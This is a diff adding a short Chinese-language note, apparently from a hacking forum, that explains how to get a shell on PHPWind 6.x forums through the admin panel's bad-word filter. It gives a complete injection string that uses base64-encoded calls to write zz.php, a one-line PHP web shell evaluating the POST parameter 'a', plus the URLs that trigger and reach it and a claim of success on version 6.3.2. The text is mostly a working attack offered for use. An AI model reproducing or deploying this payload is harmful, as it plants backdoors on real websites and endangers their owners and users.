@@ -1,0 +1,17 @@
+linux系统 iis解析方法直接放弃
+1.此方法针对PW论坛6.x的。
+
+还是在后台，来到 不良词语过滤 这里
+在不良词语中填写 
+
+',fputs(fopen(base64_decode("enoucGhw"),"w"),base64_decode("PD9ldmFsKCRfUE9TVFthXSk7Pz4=")),'a
+
+替换为那里可以随便填写
+提交成功后,直接访问http://论坛地址/data/bbsache/wordsfb.php
+会显示出错吧，不过，我们也在当前目录下生成了一个名字为zz.php的一句话木马，也就是说木马地址为http://论坛地址/data/bbsache/zz.php
+密码为a，以下是zz.php中的内容！ 
+
+
+2.http://www.t00ls.net/viewthread. ... p;extra=&amp;page=1
+
+PHPwind 6.3.2测试成功
